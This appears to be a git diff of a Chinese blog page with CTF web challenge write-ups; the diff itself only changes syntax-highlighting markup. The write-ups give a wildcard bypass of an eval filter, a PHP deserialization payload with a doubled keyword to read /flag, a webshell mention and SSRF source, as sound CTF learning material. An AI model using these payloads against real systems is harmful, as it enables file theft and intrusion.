@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      790 字
+      718 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      12
+      10
        分钟
     </span>
   
@@ -270,17 +270,17 @@ php_flag engine on
 <p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png" srcset="/img/loading.gif">        </p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p>
 <h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;<span class="hljs-keyword">else</span>&#123;
-    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];
-    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;
-        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>); 
-    &#125;
-    <span class="hljs-keyword">eval</span>($code);
-&#125;</code></pre></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[A-Za-z0-9_$@]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fighting!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre></code></pre>
 <p>过滤了字母数字还有<code>_@$</code>    </p>
 <p>试了下异或，不行；url取反也不行，就没招了…….      </p>
 <p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p>
@@ -292,108 +292,108 @@ error_reporting(<span class="hljs-number">0</span>);
 <p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p>
 <p>扫到<code>.index.php.swp</code>       </p>
 <p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;
-    <span class="hljs-keyword">public</span> $logFile;
-    <span class="hljs-keyword">public</span> $initMsg;
-    <span class="hljs-keyword">public</span> $exitMsg;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">logger</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$logFile</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$initMsg</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$exitMsg</span><span class="token punctuation">;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;
-        <span class="hljs-comment">// initialise variables</span>
-        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;
-        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;
-        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;
-        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">// initialise variables</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">initMsg</span><span class="token operator">=</span><span class="token double-quoted-string string">"#--session started--#\n"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exitMsg</span><span class="token operator">=</span><span class="token double-quoted-string string">"#--session end--#\n"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span> <span class="token operator">=</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>
+        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;
-        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);
-        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);
-        fclose($fd);
-    &#125;
+    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;
-    &#125;
-&#125;
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is destruct"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;
-    <span class="hljs-keyword">public</span> $weblogfile;
+<span class="token keyword">class</span> <span class="token class-name">weblog</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$weblogfile</span><span class="token punctuation">;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
-        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;
-    &#125;
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('cat /flag')"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
-        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>
-        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);
-    &#125;
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">// self::waf($this->filepath);</span>
+        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">logger</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">weblogfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;
-        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);
-        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);
-        <span class="hljs-keyword">return</span> $str;
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[&lt;>*#'|?\n ]/"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;
-    &#125;
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is destruct"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-&#125;
+<span class="token punctuation">&#125;</span>
 
-$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];
-$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);
-$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);
-$log_unser = unserialize($log);
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[&lt;>*#'|?\n ]/"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$log_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-meta">?&gt;</span>
+<span class="token delimiter important">?></span></span>
 
-&lt;html&gt;
-&lt;body&gt;
-&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre></code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>昨天晚上因为14级大风停电了.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></code></pre>
 <p><code>readfile</code>  、 flag在<code>/flag</code>      </p>
 <p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p>
 <p>flag过滤了，双写即可绕过    </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $logFile;
-    <span class="hljs-keyword">public</span> $initMsg;
-    <span class="hljs-keyword">public</span> $exitMsg;
-&#125;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">logger</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$logFile</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$initMsg</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$exitMsg</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;
-&#125;
-$a=<span class="hljs-keyword">new</span> weblog();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
+<span class="token keyword">class</span> <span class="token class-name">weblog</span> 
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$weblogfile</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">weblog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre>
 <p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png" srcset="/img/loading.gif">      </p>
-<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-    session_start();
-    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;
-    <span class="hljs-keyword">if</span>($url)
-    &#123;
-    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);
-        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)
-        &#123;
-            <span class="hljs-keyword">exit</span>();
-        &#125;
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/file|dict/i"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);
-            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
-            curl_exec($ch);
-            curl_close($ch);
-    &#125;
+            <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <p>SSRF    </p>
 <p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p>
 <p>算了，环境也关了，附上<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p>
